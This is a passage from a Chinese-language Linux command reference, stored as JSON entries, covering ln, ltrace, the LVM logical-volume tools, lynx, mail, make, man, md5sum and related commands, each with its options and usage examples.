\n\n```\n-b或--backup：删除，覆盖目标文件之前的备份；\n-d或-F或——directory：建立目录的硬连接；\n-f或——force：强行建立文件或目录的连接，不论文件或目录是否存在；\n-i或——interactive：覆盖既有文件之前先询问用户；\n-n或--no-dereference：把符号连接的目的目录视为一般文件；\n-s或——symbolic：对源文件建立符号连接，而非硬连接；\n-S\u003c字尾备份字符串\u003e或--suffix\u003d\u003c字尾备份字符串\u003e：用\"-b\"参数备份目标文件后，备份文件的字尾会被加上一个备份字符串，预设的备份字符串是符号“~”，用户可通过“-S”参数来改变它；\n-v或——verbose：显示指令执行过程；\n-V\u003c备份方式\u003e或--version-control\u003d\u003c备份方式\u003e：用“-b”参数备份目标文件后，备份文件的字尾会被加上一个备份字符串，这个字符串不仅可用“-S”参数变更，当使用“-V”参数\u003c备份方式\u003e指定不同备份方式时，也会产生不同字尾的备份字符串；\n--help：在线帮助；\n--version：显示版本信息。\n```\n\n### 参数  \n\n*   源文件：指定连接的源文件。如果使用`-s`选项创建符号连接，则“源文件”可以是文件或者目录。创建硬连接时，则“源文件”参数只能是文件；\n*   目标文件：指定源文件的目标连接文件。\n\n### 实例  \n\n将目录`/usr/mengqc/mub1`下的文件m2.c链接到目录`/usr/liu`下的文件a2.c\n\n```\ncd /usr/mengqc\nln /mub1/m2.c /usr/liu/a2.c\n```\n\n在执行ln命令之前，目录`/usr/liu`中不存在a2.c文件。执行ln之后，在`/usr/liu`目录中才有a2.c这一项，表明m2.c和a2.c链接起来（注意，二者在物理上是同一文件），利用`ls -l`命令可以看到链接数的变化。\n\n在目录`/usr/liu`下建立一个符号链接文件abc，使它指向目录`/usr/mengqc/mub1`\n\n```\nln -s /usr/mengqc/mub1 /usr/liu/abc\n```\n\n执行该命令后，`/usr/mengqc/mub1`代表的路径将存放在名为`/usr/liu/abc`的文件中。\n\n## 扩展知识  \n\nLinux具有为一个文件起多个名字的功能，称为链接。被链接的文件可以存放在相同的目录下，但是必须有不同的文件名，而不用在硬盘上为同样的数据重复备份。另外，被链接的文件也可以有相同的文件名，但是存放在不同的目录下，这样只要对一个目录下的该文件进行修改，就可以完成对所有目录下同名链接文件的修改。对于某个文件的各链接文件，我们可以给它们指定不同的存取权限，以控制对信息的共享和增强安全性。\n\n文件链接有两种形式，即硬链接和符号链接。\n\n### 硬链接  \n\n建立硬链接时，在另外的目录或本目录中增加目标文件的一个目录项，这样，一个文件就登记在多个目录中。如图所示的m2.c文件就在目录mub1和liu中都建立了目录项。\n\n创建硬链接后，己经存在的文件的I节点号（Inode）会被多个目录文件项使用。一个文件的硬链接数可以在目录的长列表格式的第二列中看到，无额外链接的文件的链接数为l。\n\n在默认情况下，ln命令创建硬链接。ln命令会增加链接数，rm命令会减少链接数。一个文件除非链接数为0，否则不会从文件系统中被物理地删除。\n\n对硬链接有如下限制：\n\n*   不能对目录文件做硬链接。\n*   不能在不同的文件系统之间做硬链接。就是说，链接文件和被链接文件必须位于同一个文件系统中。\n\n### 符号链接  \n\n符号链接也称为软链接，是将一个路径名链接到一个文件。这些文件是一种特别类型的文件。事实上，它只是一个文本文件（如图中的abc文件），其中包含它提供链接的另一个文件的路径名，如图中虚线箭头所示。另一个文件是实际包含所有数据的文件。所有读、写文件内容的命令被用于符号链接时，将沿着链接方向前进来访问实际的文件。\n\n!符号连接\n\n与硬链接不同的是，符号链接确实是一个新文件，当然它具有不同的I节点号；而硬链接并没有建立新文件。\n\n符号链接没有硬链接的限制，可以对目录文件做符号链接，也可以在不同文件系统之间做符号链接。\n\n用`ln -s`命令建立符号链接时，源文件最好用绝对路径名。这样可以在任何工作目录下进行符号链接。而当源文件用相对路径时，如果当前的工作路径与要创建的符号链接文件所在路径不同，就不能进行链接。\n\n符号链接保持了链接与源文件或目录之间的区别：\n\n*   删除源文件或目录，只删除了数据，不会删除链接。一旦以同样文件名创建了源文件，链接将继续指向该文件的新数据。\n*   在目录长列表中，符号链接作为一种特殊的文件类型显示出来，其第一个字母是l。\n*   符号链接的大小是其链接文件的路径名中的字节数。\n*   当用`ln -s`命令列出文件时，可以看到符号链接名后有一个箭头指向源文件或目录，例如`lrwxrwxrwx … 14 jun 20 10:20 /etc/motd-\u003e/original_file`其中，表示“文件大小”的数字“14”恰好说明源文件名`original_file`由14个字符构成。\n\n\n"},{"name":"lnstat","categoryId":0,"data":"lnstat\n\u003d\u003d\u003d\n\n显示Linux系统的网路状态\n\n## 补充说明\n\n**lnstat命令** 用来显示Linux系统的网路状态。\n\n### 语法  \n\n```\nlnstat(选项)\n```\n\n### 选项  \n\n```\n-h：显示帮助信息；\n-V：显示指令版本信息；\n-c：指定显示网络状态的次数，每隔一定时间显示一次网络状态；\n-d：显示可用的文件或关键字；\n-i：指定两次显示网络状的间隔秒数；\n-k：只显示给定的关键字；\n-s：是否显示标题头；\n-w：指定每个字段所占的宽度。\n```\n\n\n"},{"name":"lsusb","categoryId":0,"data":"lsusb\n\u003d\u003d\u003d\n\n显示本机的USB设备列表信息\n\n## 补充说明\n\n**lsusb命令** 用于显示本机的USB设备列表，以及USB设备的详细信息。\n\nlsusb命令是一个学习USB驱动开发，认识USB设备的助手，推荐大家使用，如果您的开发板中或者产品中没有lsusb命令可以自己移植一个，放到文件系统里面。\n\n### 语法  \n\n```\nlsusb(选项)\n```\n\n### 选项  \n\n```\n-v：显示USB设备的详细信息；\n-s\u003c总线：设备号\u003e仅显示指定的总线和（或）设备号的设备；\n-d\u003c厂商：产品\u003e：仅显示指定厂商和产品编号的设备；\n-t：以树状结构显示无理USB设备的层次；\n-V：显示命令的版本信息。\n```\n\n### 实例  \n\n插入usb鼠标后执行lsusb的输出内容如下:\n\n```\nBus 005 Device 001: id 0000:0000 \nBus 001 Device 001: ID 0000:0000 \nBus 004 Device 001: ID 0000:0000 \nBus 003 Device 001: ID 0000:0000 \nBus 002 Device 006: ID 15d9:0a37 \nBus 002 Device 001: ID 0000:0000 \n```\n\n解释：\n\n **Bus 005** \n\n表示第五个usb主控制器(机器上总共有5个usb主控制器 -- 可以通过命令lspci | grep USB查看)\n\n **Device 006** \n\n表示系统给usb鼠标分配的设备号(devnum)，同时也可以看到该鼠标是插入到了第二个usb主控制器\n\n```\n006        usb_device.devnum\n/sys/devices/pci0000:00/0000:00:1d.1/usb2/2-2/devnum\n```\n\n **ID 15d9:0a37** \n\n表示usb设备的ID（这个ID由芯片制造商设置，可以唯一表示该设备）\n\n```\n15d9    usb_device_descriptor.idVendor\n0a37    usb_device_descriptor.idProduct\n/sys/devices/pci0000:00/0000:00:1d.1/usb2/2-2/idVendor\n```\n\n**Bus 002 Device 006: ID 15d9:0a37  \nBus 002 Device 001: ID 0000:0000**\n\n表示002号usb主控制器上接入了两个设备:\n\n*   一个是usb根Hub -- 001 \n*   一个是usb鼠标  -- 006\n\n\n"},{"name":"ltrace","categoryId":0,"data":"ltrace\n\u003d\u003d\u003d\n\n用来跟踪进程调用库函数的情况\n\n## 补充说明\n\n**ltrace命令** 是用来跟踪进程调用库函数的情况。\n\n### 语法  \n\n```\nltrace [option ...] [command [arg ...]]\n```\n\n### 选项  \n\n```\n-a 对齐具体某个列的返回值。\n-c 计算时间和调用，并在程序退出时打印摘要。\n-C 解码低级别名称（内核级）为用户级名称。\n-d 打印调试信息。\n-e 改变跟踪的事件。\n-f 跟踪子进程。\n-h 打印帮助信息。\n-i 打印指令指针，当库调用时。\n-l 只打印某个库中的调用。\n-L 不打印库调用。\n-n, --indent\u003dNR 对每个调用级别嵌套以NR个空格进行缩进输出。\n-o, --output\u003dfile 把输出定向到文件。\n-p PID 附着在值为PID的进程号上进行ltrace。\n-r 打印相对时间戳。\n-s STRLEN 设置打印的字符串最大长度。\n-S 显示系统调用。\n-t, -tt, -ttt 打印绝对时间戳。\n-T 输出每个调用过程的时间开销。\n-u USERNAME 使用某个用户id或组ID来运行命令。\n-V, --version 打印版本信息，然后退出。\n-x NAME treat the global NAME like a library subroutine.（求翻译）\n```\n\n### 实例  \n\n最基本应用，不带任何参数：\n\n```\n[guest@localhost tmp]$ ltrace ./a.out\n__libc_start_main(0x80484aa, 1, 0xbfc07744, 0x8048550, 0x8048540 \u003cunfinished ...\u003e\nprintf(\"no1:%d \\t no2:%d \\t diff:%d\\n\", 10, 6, 4no1:10 no2:6 diff:4 ) \u003d 24\nprintf(\"no1:%d \\t no2:%d \\t diff:%d\\n\", 9, 7, 2no1:9 no2:7 diff:2 ) \u003d 23\nprintf(\"no1:%d \\t no2:%d \\t diff:%d\\n\", 8, 8, 0no1:8 no2:8 diff:0 ) \u003d 23\n--- SIGFPE (Floating point exception) ---\n+++ killed by SIGFPE +++\n```\n\n输出调用时间开销：\n\n```\n[guest@localhost tmp]$ ltrace -T ./a.out\n__libc_start_main(0x80484aa, 1, 0xbf81d394, 0x8048550, 0x8048540 \u003cunfinished ...\u003e\nprintf(\"no1:%d \\t no2:%d \\t diff:%d\\n\", 10, 6, 4no1:10 no2:6 diff:4 ) \u003d 24 \u003c0.000972\u003e\nprintf(\"no1:%d \\t no2:%d \\t diff:%d\\n\", 9, 7, 2no1:9 no2:7 diff:2 ) \u003d 23 \u003c0.000155\u003e\nprintf(\"no1:%d \\t no2:%d \\t diff:%d\\n\", 8, 8, 0no1:8 no2:8 diff:0 ) \u003d 23 \u003c0.000153\u003e\n--- SIGFPE (Floating point exception) ---\n+++ killed by SIGFPE +++\n```\n\n显示系统调用：\n\n```\n[guest@localhost tmp]$ ltrace -S ./a.out\nSYS_brk(NULL) \u003d 0x9e20000\nSYS_access(0xa4710f, 4, 0xa4afc0, 0, 0xa4b644) \u003d 0\nSYS_open(\"/etc/ld.so.preload\", 0, 02) \u003d 3\nSYS_fstat64(3, 0xbfbd7a94, 0xa4afc0, -1, 3) \u003d 0\nSYS_mmap2(0, 17, 3, 2, 3) \u003d 0xb7f2a000\nSYS_close(3) \u003d 0\nSYS_open(\"/lib/libcwait.so\", 0, 00) \u003d 3\nSYS_read(3, \"\\177ELF\\001\\001\\001\", 512) \u003d 512\nSYS_fstat64(3, 0xbfbd76fc, 0xa4afc0, 4, 0xa4b658) \u003d 0\nSYS_mmap2(0, 4096, 3, 34, -1) \u003d 0xb7f29000\nSYS_mmap2(0, 5544, 5, 2050, 3) \u003d 0x423000\nSYS_mmap2(0x424000, 4096, 3, 2066, 3) \u003d 0x424000\n.............省去若干行\n```\n\n\n"},{"name":"lvcreate","categoryId":0,"data":"lvcreate\n\u003d\u003d\u003d\n\n用于创建LVM的逻辑卷\n\n## 补充说明\n\n**lvcreate命令** 用于创建LVM的逻辑卷。逻辑卷是创建在卷组之上的。逻辑卷对应的设备文件保存在卷组目录下，例如：在卷组\"vg1000\"上创建一个逻辑卷\"lvol0\"，则此逻辑卷对应的设备文件为\"/dev/vg1000/lvol0\"。\n\n### 语法  \n\n```\nlvcreate(选项)(参数)\n```\n\n### 选项  \n\n```\n-L：指定逻辑卷的大小，单位为“kKmMgGtT”字节；\n-l：指定逻辑卷的大小（LE数）。\n```\n\n### 参数  \n\n逻辑卷：指定要创建的逻辑卷名称。\n\n### 实例  \n\n使用lvcreate命令在卷组\"vg1000\"上创建一个200MB的逻辑卷。在命令行中输入下面的命令：\n\n```\n[root@localhost ~]# lvcreate -L 200M vg1000    #创建大小为200M的逻辑卷\n```\n\n输出信息如下：\n\n```\nLogical volume \"lvol0\" created\n```\n\n说明：创建成功后，新的逻辑卷\"lvol0\"，将通过设备文件`/dev/vg1000/lvol0`进行访问。\n\n\n"},{"name":"lvdisplay","categoryId":0,"data":"lvdisplay\n\u003d\u003d\u003d\n\n显示逻辑卷属性\n\n## 补充说明\n\n**lvdisplay命令** 用于显示LVM逻辑卷空间大小、读写状态和快照信息等属性。如果省略\"逻辑卷\"参数，则lvdisplay命令显示所有的逻辑卷属性。否则，仅显示指定的逻辑卷属性。\n\n### 语法  \n\n```\nlvdisplay(参数)\n```\n\n### 参数  \n\n逻辑卷：指定要显示属性的逻辑卷对应的设备文件。\n\n### 实例  \n\n使用lvdisplay命令显示指定逻辑卷的属性。在命令行中输入下面的命令：\n\n```\n[root@localhost ~]# lvdisplay /dev/vg1000/lvol0     #显示逻辑卷属性\n```\n\n输出信息如下：\n\n```\n  --- Logical volume ---  \n  LV Name                /dev/vg1000/lvol0  \n......省略部分输出内容......  \n  Block device           253:0\n```\n\n\n"},{"name":"lvextend","categoryId":0,"data":"lvextend\n\u003d\u003d\u003d\n\n扩展逻辑卷空间\n\n## 补充说明\n\n**lvextend命令** 用于在线扩展逻辑卷的空间大小，而不中断应用程序对逻辑卷的访问。使用lvextend命令动态在线扩展磁盘空间，整个空间扩展过程对于应用程序来说是完全透明的。\n\n### 语法  \n\n```\nlvextend(选项)(参数)\n```\n\n### 选项  \n\n```\n-L：指定逻辑卷的大小，单位为“kKmMgGtT”字节；\n-l：指定逻辑卷的大小（LE数）。\n```\n\n### 参数  \n\n逻辑卷：指定要扩展空间的逻辑卷。\n\n### 实例  \n\n使用lvextend命令为逻辑卷`/dev/vg1000/lvol0`增加100M空间。在命令行中输入下面的命令：\n\n```\n[root@localhost ~]# lvextend -L +100M /dev/vg1000/lvol0    #为了解决增加100M空间\n```\n\n输出信息如下：\n\n```\nExtending logical volume lvol0 to 300.00 MB  \nLogical volume lvol0 successfully resized\n```\n\n\n"},{"name":"lvreduce","categoryId":0,"data":"lvreduce\n\u003d\u003d\u003d\n\n收缩逻辑卷空间\n\n## 补充说明\n\n**lvreduce命令** 用于减少LVM逻辑卷占用的空间大小。使用lvreduce命令收缩逻辑卷的空间大小有可能会删除逻辑卷上已有的数据，所以在操作前必须进行确认。\n\n### 语法  \n\n```\nlvreduce(选项)(参数)\n```\n\n### 选项  \n\n```\n-L：指定逻辑卷的大小，单位为“kKmMgGtT”字节；\n-l：指定逻辑卷的大小（LE数）。\n```\n\n### 参数  \n\n逻辑卷：指定要操作的逻辑卷对应的设备文件。\n\n### 实例  \n\n使用lvreduce命令减少指定的逻辑卷的空间大小。在命令行中输入下面的命令：\n\n```\n[root@localhost ~]# lvreduce -L -50M /dev/vg1000/lvol0     #将逻辑卷的空间大小减少50M\n```\n\n输出信息如下：\n\n```\n......省略部分输出内容......  \nDo you really want to reduce lvol0? [y/n]: y  #确认操作  \n  Reducing logical volume lvol0 to 252.00 MB  \n  Logical volume lvol0 successfully resized\n```\n\n\n"},{"name":"lvremove","categoryId":0,"data":"lvremove\n\u003d\u003d\u003d\n\n删除指定LVM逻辑卷\n\n## 补充说明\n\n**lvremove命令** 用于删除指定LVM逻辑卷。如果逻辑卷已经使用mount命令加载，则不能使用lvremove命令删除。必须使用umount命令卸载后，逻辑卷方可被删除。\n\n### 语法  \n\n```\nlvremove(选项)(参数)\n```\n\n### 选项  \n\n```\n-f：强制删除。\n```\n\n### 参数  \n\n逻辑卷：指定要删除的逻辑卷。\n\n### 实例  \n\n使用lvremove命令删除指定的逻辑卷。在命令行中输入下面的命令：\n\n```\n[root@localhost ~]# lvremove /dev/vg1000/lvol0    #删除逻辑卷\"lvol0\"\n```\n\n输出信息如下：\n\n```\nDo you really want to remove active logical \nvolume \"lvol0\"? [y/n]: y    #确认删除\n  Logical volume \"lvol0\" successfully removed\n```\n\n\n"},{"name":"lvresize","categoryId":0,"data":"lvresize\n\u003d\u003d\u003d\n\n调整逻辑卷空间大小\n\n## 补充说明\n\n**lvresize命令** 用于调整LVM逻辑卷的空间大小，可以增大空间和缩小空间。使用lvresize命令调整逻辑卷空间大小和缩小空间时需要谨慎，因为它有可能导致数据丢失。\n\n### 语法  \n\n```\nlvresize(选项)(参数)\n```\n\n### 选项  \n\n```\n-L：指定逻辑卷的大小，单位为“kKmMgGtT”字节；\n-l：指定逻辑卷的大小（LE数）。\n```\n\n### 参数  \n\n逻辑卷：指定要删除的逻辑卷。\n\n### 实例  \n\n使用lvresize命令调整最大的逻辑卷大小。在命令行中输入下面的命令：\n\n```\n[root@localhost ~]# lvresize -L +200M /dev/vg1000/lvol0     #将逻辑卷空间增加200M\n```\n\n输出信息如下：\n\n```\nExtending logical volume lvol0 to 280.00 MB\nLogical volume lvol0 successfully resized\n```\n\n\n"},{"name":"lvscan","categoryId":0,"data":"lvscan\n\u003d\u003d\u003d\n\n扫描逻辑卷\n\n## 补充说明\n\n**lvscan命令** 用于扫描当前系统中存在的所有的LVM逻辑卷。使用lvscan指令可以发现系统中的所有逻辑卷，及其对应的设备文件。\n\n### 语法  \n\n```\nlvscan(选项)\n```\n\n### 选项  \n\n```\n-b：显示逻辑卷的主设备和次设备号。\n```\n\n### 实例  \n\n使用lvscan命令扫描系统中的所有逻辑卷。在命令行中输入下面的命令：\n\n```\n[root@localhost ~]# lvscan     #扫描所有的逻辑卷\n```\n\n输出信息如下：\n\n```\nACTIVE          \u0027/dev/vg1000/lvol0\u0027 [200.00 MB] inherit\n```\n\n\n"},{"name":"lynx","categoryId":0,"data":"lynx\n\u003d\u003d\u003d\n\n纯文本模式的网页浏览器\n\n## 补充说明\n\n**lynx命令** 是纯文本模式的网页浏览器，不支持图形、音视频等多媒体信息。\n\n### 语法  \n\n```\nlynx(选项)(参数)\n```\n\n### 选项  \n\n```\n-case：在搜索字符串时，区分大小写；\n-ftp：关闭ftp功能；\n-nobrowse：关闭目录浏览功能；\n-noclor：关闭色彩显示模式；\n-reload：更新代理服务器的缓存，只对首页有效；\n--color：如果系统支持彩色模式，则激活彩色模式；\n--help：显示指令的帮助信息；\n--versiom：显示指令的版本信息。\n```\n\n### 参数  \n\nURL：指定要访问的网站的URL地址。\n\n## 内部命令  \n\n **移动命令** \n\n```\n下方向键：页面上的下一个链接(用高亮度显示)。\n上方向键：页面上的前一个链接(用高亮度显示)。\n回车和右方向键：跳转到链接指向的地址。\n左方向键：回到上一个页面。\n```\n\n **滚动命令** \n\n```\n+、Page-Down、Space、Ctrl+f：向下翻页。\n-、Page-Up、b、Ctrl+b：向上翻页。\nCtrl+a：移动到当前页的最前面。\nCtrl+e：移动到当前页的最后面。\nCtrl+n：向下翻两行。\nCtrl+p：往回翻两行。\n)：向下翻半页。\n(：往回翻半页。\n#：回到当前页的 Toolbar 或 Banner。\n```\n\n **文件操作命令** \n\n```\nc：建立一个新文件。\nd：下载选中的文件。\nE：编辑选中的文件。\nf：为当前文件显示一个选项菜单。\nm：修改选中文件的名字或位置。\nr：删除选中的文件。\nt：Tag highlighted file。\nu：上载一个文件到当前目录。\n```\n\n **其他命令** \n\n```\n?、h：帮助。\na：把当前链接加入到一个书签文件里。\nc：向页面的拥有者发送意见或建议。\nd：下载当前链接。\ne：编辑当前文件。\ng：跳转到一个用户 指定的URL或文件。\nG：编辑当前页的URL，并跳转到这个URL。\ni：显示文档索引。\nj：执行预先定义的“短”命令。\nk：显示键盘命令列表。\nl：列出当前页上所有链接的地址。\nm：回到首页 。\no：设置选项。\np：把当前页输出到文件，e-mail，打印机或其他地方。\nq：退出。\n/：在当前页内查找字符串。\ns：在外部搜索输入的字符串。\nn：搜索下一个。\nv：查看一个书签文件。\nV：跳转到访问过的地址。\nx：不使用缓存。\nz：停止当前传输。\n[backspace]：跳转到历史页(同 V 命令)。\n\u003d：显示当前页的信息。\n：查看当前页的源代码。\n!：回到shell提示符下。\n_：清除当前任务的所有授权信息。\n*：图形链接模式的切换开关。\n@：8位传输模式或CJK模式的切换开关。\n[：pseudo_inlines 模式的切换开关。\n]：为当前页或当前链接发送一个“head”请求。\nCtrl+r：重新装如当前页并且刷新屏幕。\nCtrl+w：刷新屏幕。\nCtrl+u：删除输入的行。\nCtrl+g：取消输入或者传送。\nCtrl+t：跟踪模式的切换开关。\n;：看Lynx对当前任务的跟踪记录。\nCtrl+k：调用 Cookie Jar 页。\n数字键：到后面的第 n 个链接。\n```\n\n\n"},{"name":"mail","categoryId":5,"data":"mail\n\u003d\u003d\u003d\n\n命令行下发送和接收电子邮件\n\n## 补充说明\n\n**mail命令** 是命令行的电子邮件发送和接收工具。操作的界面不像elm或pine那么容易使用，但功能非常完整。\n\n### 语法  \n\n```\nmail(选项)(参数)\n```\n\n### 选项  \n\n```\n-b\u003c地址\u003e：指定密件副本的收信人地址；\n-c\u003c地址\u003e：指定副本的收信人地址；\n-f\u003c邮件文件\u003e：读取指定邮件文件中的邮件；\n-i：不显示终端发出的信息；\n-I：使用互动模式；\n-n：程序使用时，不使用mail.rc文件中的设置；\n-N：阅读邮件时，不显示邮件的标题；\n-s\u003c邮件主题\u003e：指定邮件的主题；\n-u\u003c用户帐号\u003e：读取指定用户的邮件；\n-v：执行时，显示详细的信息。\n```\n\n### 参数  \n\n邮件地址：收信人的电子邮箱地址。\n\n### 实例  \n\n **直接使用shell当编辑器** \n\n```\nmail -s \"Hello from jsdig.com by shell\" admin@jsdig.com\nhello,this is the content of mail.\nwelcome to www.jsdig.com\n```\n\n第一行是输入的命令，`-s`表示邮件的主题，后面的`admin@jsdig.com`则是邮件的接收人，输入完这行命令后回车，会进入邮件正文的编写，我们可以输入任何文字，比如上面的两行。当邮件正文输入完成后，需要按 **CTRL+D** 结束输入，此时会提示你输入Cc地址，即邮件抄送地址，没有直接回车就完成了邮件的发送。\n\n **使用管道进行邮件发送** \n\n```\necho \"hello,this is the content of mail.welcome to www.jsdig.com\" | mail -s \"Hello from jsdig.com by pipe\" admin@jsdig.com\n```\n\n使用管道直接敲入这行命令即可完成邮件的发送，其中echo后的是邮件正文。\n\n **使用文件进行邮件发送** \n\n```\nmail -s \"Hello from jsdig.com by file\" admin@jsdig.com \u003c mail.txt\n```\n\n使用上面的命令后，我们就可以把mail.txt文件的内容作为邮件的内容发送给admin@jsdig.com了。\n\n使用上述三种方式都可以给外部邮箱进行邮件发送，但因为前面2中都是直接在shell中敲入邮件内容，因此无法输入中文，即使我们使用粘贴的方式输入了中文，那么收到的邮件也是乱码的。但第3种方式，我们可以在window下编辑好邮件内容后，放到linux下，再进行发送，这样就可以正常发送中文了。不过目前邮件的中文标题暂时没有找到解决办法。\n\n因为mail程序本身就是调用sendmail来进行邮件发送的，因此我们可以在mail命令中使用sendmail的参数进行配置，比如我想使用特定的发件人发送邮件，可以使用如下命令：\n\n```\nmail -s \"Hello from jsdig.com with sender\" admin@jsdig.com -- -f user@jsdig.com\u003cmail.txt\n```\n\n上面的命令中，我们使用了– -f user@jsdig.com这样的参数，这是sendmail的选项，其中-f表示邮件的发送人邮件地址。\n\n很多情况下，我们也需要使用邮件来发送附件，在linux下使用mail命令发送附件也很简单，不过首先需要安装uuencode软件包，这个程序是对二进制文件进行编码使其适合通过邮件进行发送，在CentOS上安装该软件包如下：\n\n```\nyum install sharutils\n```\n\n安装完成后我们就可以来进行附件的发送了，使用如下命令：\n\n```\nuuencode test.txt test | mail -s \"hello,see the attachement\" admin@jsdig.com\u003cmail.txt\n```\n\n完成后就可以把text.txt文件作为邮件的附件发送出去了。uuencode有两个参数，第一个是要发送的文件，第二个是显示的文件名称。\n\n这里我主要介绍的是在CentOS下使用mail发送电子邮件的一些使用方法，需要的要求是你的linux必须安装了sendmail并开启了，同时保证可以连接外网。另外，文章中提到的命令本人都经过亲自测试，保证完全可用，不过你需要将命令中的电子邮件地址换成自己的电子邮件地址。\n\n\n"},{"name":"mailq","categoryId":5,"data":"mailq\n\u003d\u003d\u003d\n\n显示待发送的邮件队列\n\n## 补充说明\n\n**mailq命令** 用户显示待发送的邮件队列，显示的每一个条目包括邮件队列id、邮件大小、加入队列时间、邮件发送者和接受者。如果邮件最后一次尝试后还没有将邮件投递出去，则显示发送失败的原因。\n\n### 语法  \n\n```\nmailq(选项)\n```\n\n### 选项  \n\n```\n-v：显示详细的信息。\n```\n\n### 实例  \n\n```\n[root@localhost ~]# mailq -v\n/var/spool/mqueue is empty\n                Total requests: 0\n```\n\n\n"},{"name":"mailstat","categoryId":0,"data":"mailstat\n\u003d\u003d\u003d\n\n显示到达的邮件状态\n\n## 补充说明\n\n**mailstat命令** 用来显示到达的邮件状态。\n\n### 语法  \n\n```\nmailstat(选项)(参数)\n```\n\n### 选项  \n\n```\n-k：保持邮件日志文件的完整性，不清空日志文件；\n-l：使用长格式显示邮件状态；\n-m：合并任何错误信息到一行中显示；\n-o：使用老的邮件日志邮件；\n-t：使用简洁的格式显示邮件状态；\n-s：如果没有邮件则不输出任何信息。\n```\n\n### 参数  \n\n邮件日志文件：指定要读取邮件日志文件。\n\n\n"},{"name":"make","categoryId":0,"data":"make\n\u003d\u003d\u003d\n\nGNU的工程化编译工具\n\n## 补充说明\n\n**make命令** 是GNU的工程化编译工具，用于编译众多相互关联的源代码问价，以实现工程化的管理，提高开发效率。\n\n### 语法  \n\n```\nmake(选项)(参数)\n```\n\n### 选项  \n\n```\n-f：指定“makefile”文件；\n-i：忽略命令执行返回的出错信息；\n-s：沉默模式，在执行之前不输出相应的命令行信息；\n-r：禁止使用build-in规则；\n-n：非执行模式，输出所有执行命令，但并不执行；\n-t：更新目标文件；\n-q：make操作将根据目标文件是否已经更新返回\"0\"或非\"0\"的状态信息；\n-p：输出所有宏定义和目标文件描述；\n-d：Debug模式，输出有关文件和检测时间的详细信息。\n```\n\nLinux下常用选项与Unix系统中稍有不同，下面是不同的部分：\n\n```\n-c dir：在读取 makefile 之前改变到指定的目录dir；\n-I dir：当包含其他 makefile文件时，利用该选项指定搜索目录；\n-h：help文挡，显示所有的make选项；\n-w：在处理 makefile 之前和之后，都显示工作目录。\n```\n\n### 参数  \n\n目标：指定编译目标。\n\n### 知识扩展  \n\n无论是在linux 还是在Unix环境 中，make都是一个非常重要的编译命令。不管是自己进行项目开发还是安装应用软件，我们都经常要用到make或make install。利用make工具，我们可以将大型的开发项目分解成为多个更易于管理的模块，对于一个包括几百个源文件的应用程序，使用make和 makefile工具就可以简洁明快地理顺各个源文件之间纷繁复杂的相互关系。\n\n而且如此多的源文件，如果每次都要键入gcc命令进行编译的话，那对程序员 来说简直就是一场灾难。而make工具则可自动完成编译工作，并且可以只对程序员在上次编译后修改过的部分进行编译。\n\n因此，有效的利用make和 makefile工具可以大大提高项目开发的效率。同时掌握make和makefile之后，您也不会再面对着Linux下的应用软件手足无措了。\n\n\n"},{"name":"man","categoryId":0,"data":"man\n\u003d\u003d\u003d\n\n查看Linux中的指令帮助\n\n## 补充说明\n\n**man命令** 是Linux下的帮助指令，通过man指令可以查看Linux中的指令帮助、配置文件帮助和编程帮助等信息。\n\n### 语法  \n\n```\nman(选项)(参数)\n```\n\n### 选项  \n\n```\n-a：在所有的man帮助手册中搜索；\n-f：等价于whatis指令，显示给定关键字的简短描述信息；\n-P：指定内容时使用分页程序；\n-M：指定man手册搜索的路径。\n```\n\n### 参数  \n\n*   数字：指定从哪本man手册中搜索帮助；\n*   关键字：指定要搜索帮助的关键字。\n\n### 实例  \n\n我们输入`man ls`，它会在最左上角显示“LS（1）”，在这里，“LS”表示手册名称，而“（1）”表示该手册位于第一节章，同样，我们输`man ifconfig`它会在最左上角显示“IFCONFIG（8）”。也可以这样输入命令：“man [章节号] 手册名称”。\n\nman是按照手册的章节号的顺序进行搜索的，比如：\n\n```\nman sleep\n```\n\n只会显示sleep命令的手册,如果想查看库函数sleep，就要输入:\n\n```\nman 3 sleep\n```\n\n\n"},{"name":"md5sum","categoryId":0,"data":"md5sum\n\u003d\u003d\u003d\n\n计算和校验文件报文摘要的工具程序\n\n## 补充说明\n\n**md5sum命令** 采用MD5报文摘要算法（128位）计算和检查文件的校验和。一般来说，安装了Linux后，就会有md5sum这个工具，直接在命令行终端直接运行。\n\nMD5算法常常被用来验证网络文件传输的完整性，防止文件被人篡改。MD5 全称是报文摘要算法（Message-Digest Algorithm 5），此算法对任意长度的信息逐位进行计算，产生一个二进制长度为128位（十六进制长度就是32位）的“指纹”（或称“报文摘要”），不同的文件产生相同的报文摘要的可能性是非常非常之小的。\n\n### 语法  \n\n```\nmd5sum(选项)(参数)\n```\n\n### 选项  \n\n```\n-b：二进制模式读取文件；\n-t或--text：把输入的文件作为文本文件看待；\n-c：从指定文件中读取MD5校验和，并进行校验；\n--status：验证成功时不输出任何信息；\n-w：当校验不正确时给出警告信息。\n```\n\n### 参数  \n\n文件：指定保存着文件名和校验和的文本文件。\n\n### 实例  \n\n **生成一个文件insert.sql的md5值：** \n\n```\n[root@localhost ~]# md5sum insert.sql\nbcda6cb5c704664f989703ac5a88f112  insert.sql\n```\n\n **检查文件testfile是否被修改过：** \n\n首先生成md5文件：\n\n```\nmd5sum testfile \u003e testfile.md5\n```\n\n检查：\n\n```\nmd5sum testfile -c testfile.md5\n```\n\n如果文件没有变化，输出应该如下：\n\n```\nforsort: OK\n```\n\n此时，md5sum命令返回0。\n\n如果文件发生了变化，输出应该如下：\n\n```\nforsort: FAILED\nmd5sum: WARNING: 1 of 1 computed checksum did NOT match\n```\n\n此时，md5sum命令返回非0。\n\n这里，检查用的文件名随意。如果不想有任何输出，则`md5sum testfile --status -c testfile.md5`，这时候通过返回值来检测结果。\n\n检测的时候如果检测文件非法则输出信息的选项:\n\n```\nmd5sum -w -c testfile.md5\n```\n\n输出之后，文件异常输出类似如下：\n\n```\nmd5sum: testfile.md5: 1: improperly formatted MD5 checksum line\nmd5sum: testfile.md5: no properly formatted MD5 checksum lines found\n```\n\n这里，testfile.md5只有一行信息，但是我认为地给它多加了一个字符，导致非法。如果md5文件正常那么`-w`有没有都一样。\n\n\n"},{"name":"mesg","categoryId":9,"data":"mesg\n\u003d\u003d\u003d\n\n设置当前终端的写权限\n\n## 补充说明\n\n**mesg命令** 用于设置当前终端的写权限，即是否让其他用户向本终端发信息。将mesg设置y时，其他用户可利用write命令将信息直接显示在您的屏幕上。\n\n### 语法  \n\n```\nmesg(参数)\n```\n\n### 参数  \n\ny/n：y表示运行向当前终端写信息，n表示禁止向当前终端写信息。\n\n### 实例  \n\n```\n[root@localhost ~]# 